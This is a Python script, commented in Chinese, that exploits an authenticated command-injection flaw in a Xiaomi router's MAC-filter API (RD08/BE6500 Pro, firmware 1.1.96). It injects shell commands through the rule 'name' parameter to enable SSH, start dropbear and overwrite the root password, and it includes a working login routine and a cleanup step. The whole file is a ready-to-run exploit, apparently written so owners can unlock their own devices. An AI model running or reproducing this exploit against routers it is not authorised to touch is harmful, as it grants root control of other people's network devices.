#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
小米路由器 (RD08 / BE6500 Pro, 固件 1.1.96) SSH 开启脚本
利用 /api/xqsystem/set_macfilter_rules 的 name 参数命令注入（认证后 RCE）。

用法:
    python rd08_ssh_enable.py [路由器IP] [管理密码] [想设置的root密码]
默认: 192.168.31.1 / 88888888 / admin

原理:
    name 参数属于 hackCheck 白名单（不过滤任何字符），且未经 cmdSafeCheck，
    无引号拼入 os.execute("/usr/sbin/macfilter add black <mac> rulename=<name>")。
    用 $(...) 注入任意命令。name 在控制器内按 ";" 切分，payload 不能含 ";"。
    每次请求用不同的 MAC 地址（已存在的 MAC 会走 update 分支不触发 exec）。
"""
import sys, time, random
import requests

IP   = sys.argv[1] if len(sys.argv) > 1 else '192.168.31.1'
WPHP = sys.argv[2] if len(sys.argv) > 2 else '88888888'
ROOTPW = sys.argv[3] if len(sys.argv) > 3 else 'admin'

def login(ip, password):
    """模拟 xmir-patcher 的 web 登录，返回 stok。"""
    import hashlib, re, time as t
    s = requests.Session()
    page = s.get(f'http://{ip}/cgi-bin/luci/web', timeout=5).text
    mac  = re.search(r"var deviceId = '(.*?)'", page).group(1)
    key  = re.search(r"key: '(.*?)',", page).group(1)
    nonce = f"0_{mac}_{int(t.time())}_{random.randint(1000,10000)}"
    # newEncryptMode=1 -> sha256；老固件是 sha1
    info = s.get(f'http://{ip}/cgi-bin/luci/api/xqsystem/init_info', timeout=5).json()
    h = hashlib.sha256 if str(info.get('newEncryptMode')) == '1' else hashlib.sha1
    pwd = h((nonce + h((password + key).encode()).hexdigest()).encode()).hexdigest()
    r = s.post(f'http://{ip}/cgi-bin/luci/api/xqsystem/login',
               data={'username':'admin','password':pwd,'logtype':'2','nonce':nonce}, timeout=5).json()
    if r.get('code') != 0:
        sys.exit(f'登录失败: {r}')
    return r['token']

def rce(stok, mac, cmd):
    name = f'x$({cmd})y'
    assert ';' not in name, 'payload 不能含分号'
    r = requests.post(
        f'http://{IP}/cgi-bin/luci/;stok={stok}/api/xqsystem/set_macfilter_rules',
        data={'mac': mac, 'name': name, 'option': 'add', 'wan': ''}, timeout=20)
    print(f'  [{mac}] {r.status_code} {r.text[:60]}')

def cleanup(stok, macs):
    for m in macs:
        requests.post(f'http://{IP}/cgi-bin/luci/;stok={stok}/api/xqsystem/set_macfilter_rules',
                      data={'mac': m, 'name': 'x', 'option': 'del', 'wan': ''}, timeout=8)

if __name__ == '__main__':
    print(f'[*] 登录 {IP} ...')
    stok = login(IP, WPHP)
    print(f'[+] stok = {stok[:12]}...')

    base = random.randint(0x10, 0xE0)
    macs = [f'0A:11:22:33:44:{base+i:02X}' for i in range(3)]

    print('[*] 1/3 nvram set ssh_en=1 ...')
    rce(stok, macs[0], 'nvram set ssh_en=1 && nvram commit')
    print('[*] 2/3 修改 dropbear 配置并启动 ...')
    rce(stok, macs[1], 'sed -i "s/channel=.*/channel=\\"debug\\"/g" /etc/init.d/dropbear && /etc/init.d/dropbear start')
    print(f'[*] 3/3 设置 root 密码为 {ROOTPW} ...')
    rce(stok, macs[2], f'echo -e "{ROOTPW}\\n{ROOTPW}" | passwd root')

    time.sleep(2)
    import socket
    try:
        socket.create_connection((IP, 22), timeout=3).close()
        print(f'[+] 成功！ssh root@{IP} 密码 {ROOTPW}')
        print('    注意: 重启后 dropbear 配置恢复，SSH 会失效，重跑本脚本即可')
    except OSError:
        print('[-] 端口 22 未开，可能被修复，检查响应')

    cleanup(stok, macs)
    print('[*] 已清理 macfilter 测试规则')
